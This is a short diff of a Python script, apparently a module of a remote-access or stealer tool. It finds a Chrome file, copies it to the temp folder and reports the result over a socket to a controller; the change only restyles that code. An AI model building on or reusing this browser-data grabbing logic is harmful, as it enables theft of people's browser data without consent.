@@ -18,11 +18,7 @@ def get_chrome_path():
             return "[!] Chrome Doesn't exists", False
     return PathName, True
 
-if win_client():
-    temp = 'C:\\Windows\\Temp\\'
-else:
-    temp = '/tmp/'
-
+temp = 'C:\\Windows\\Temp\\' if win_client() else '/tmp/'
 info_list = ''
 path, success = get_chrome_path()
 if success:
@@ -32,8 +28,8 @@ if success:
         shutil.copyfile(path, new_path)
         send(client_socket,"SUCCESS")
     else:
-        err = '[!] The path "{}" does not exist.'.format(path)
+        err = f'[!] The path "{path}" does not exist.'
         send(client_socket,err)
 else:
-    err = '[!] The path "{}" does not exist.'.format(path)
+    err = f'[!] The path "{path}" does not exist.'
     send(client_socket,err)
